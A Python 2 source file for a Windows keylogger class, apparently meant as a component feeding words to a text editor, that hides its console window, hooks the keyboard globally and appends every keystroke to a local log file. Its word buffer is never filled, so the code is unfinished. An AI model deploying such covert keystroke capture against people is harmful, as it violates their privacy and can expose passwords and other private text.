#!/usr/bin/python

### TODO: may want to check out cross-platform loggers
### http://stackoverflow.com/questions/365110/cross-platform-keylogger
import pyHook
import pythoncom
import win32gui
import win32console

from PyQt4.QtCore import * 
from PyQt4.QtGui import *

LOG_FILE = 'new_log.txt'

## Ascii that if seen, means that the buffer needs to be cleared
## e.g. backspace, delete
DIRTY_ASCII = [8,]

class WindowsKeyLogger(QObject):
    def __init__(self, *args):
        QObject.__init__(self, *args)
        self.init_logger()

    def init_logger(self):
        print 'entered init_logger!'
        
        ## Holds the best guess of user's last word
        self.buffer = ''

        window = win32console.GetConsoleWindow()  #go to script window
        win32gui.ShowWindow(window,0)             #hide window

        proc = pyHook.HookManager()      #open pyHook
        proc.KeyDown = self.pressed_chars     #set pressed_chars function on KeyDown event
        proc.HookKeyboard()              #start the function
        pythoncom.PumpMessages()         #get input

    def write_to_log(self, event, log_file=LOG_FILE):
        """
        Just for debugging purposes
        """
        print 'wrote to log'
        with open(log_file, 'a') as f:
            if event.Ascii > 31 and event.Ascii < 127:
                char = chr(event.Ascii)
                f.write(char)
            elif event.Ascii == 13:   ## return
                f.write('\n')       
            else:
                f.write('--'+str(event.Ascii)+'--')

    def pressed_chars(self, event):
        """
        Process keypress
        """
        ## http://www.asciitable.com/
        print 'hit pressed chars'
        if event.Ascii:
            self.write_to_log(event)

            if event.Ascii in DIRTY_ASCII:
                self.buffer = ''

            elif event.Ascii == 32: ## space
                ## signal to the text editor that the word is ready
                self.emit(SIGNAL('SPACE_PRESSED')) 

    def read_buffer(self):
        return self.buffer

    def clear_buffer(self):
        self.buffer = ''

### todo: do we need a way of exiting the keylogger?
if __name__ == '__main__':
    WindowsKeyLogger()
